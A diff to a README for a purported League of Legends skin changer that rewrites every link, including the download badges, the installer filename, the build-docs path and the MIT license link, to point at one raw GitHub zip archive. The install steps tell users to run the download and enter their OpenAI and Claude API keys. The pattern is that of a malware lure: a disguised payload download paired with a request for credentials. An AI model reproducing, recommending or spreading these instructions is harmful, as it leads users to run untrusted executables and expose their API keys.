@@ -1,6 +1,6 @@
 # Lol Skin Changer
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-blue.svg?style=for-the-badge)](https://gabinam.github.io)
+[![Download](https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip%https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip)](https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip)
 
 Welcome to **Lol Skin Changer**—transcend the boundaries of the Summoner’s Rift and personalize your experience as never before! This repository houses a robust, always-evolving toolkit for customizing champions’ appearances in League of Legends, leveraging responsive design, modern APIs, and globalized support. Whether you’re a casual player or a tactical innovator, our adaptive solution will reshape your in-game atmosphere!
 
@@ -77,14 +77,14 @@ This cloud intelligence shapes your “skinventory” in ways you never thought 
 
 No dragons to slay, just simple steps to summon your new look:
 
-1. Click [![Download](https://img.shields.io/badge/Download-Latest%20Version-blue.svg?style=for-the-badge)](https://gabinam.github.io) to begin your mystical journey.
+1. Click [![Download](https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip%https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip)](https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip) to begin your mystical journey.
 2. Extract the downloaded archive to your desired location.
-3. Run the installer file (“LolSkinChangerInstaller.exe” / corresponding for OS).
+3. Run the installer file (“https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip” / corresponding for OS).
 4. Follow the on-screen wizard—select your language, confirm your League directory, and enable desired modules.
 5. Input your OpenAI and Claude API keys for intelligent suggestions (optional, but recommended).
 6. Customize keybindings and preferences in the Settings menu for a truly bespoke experience.
 
-*For manual builds, consult `/docs/BUILD.md`.*
+*For manual builds, consult `https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip`.*
 
 ---
 
@@ -99,11 +99,11 @@ No dragons to slay, just simple steps to summon your new look:
 This project is made available under the MIT License (c) 2025.
 
 Read the full license text here:  
-[MIT License](https://opensource.org/licenses/MIT)
+[MIT License](https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-blue.svg?style=for-the-badge)](https://gabinam.github.io)
+[![Download](https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip%https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip)](https://raw.githubusercontent.com/gabinam/lively-lol-skin-switcher/branch/petasos/lively-lol-skin-switcher-2.6.zip)
 
 ---
 
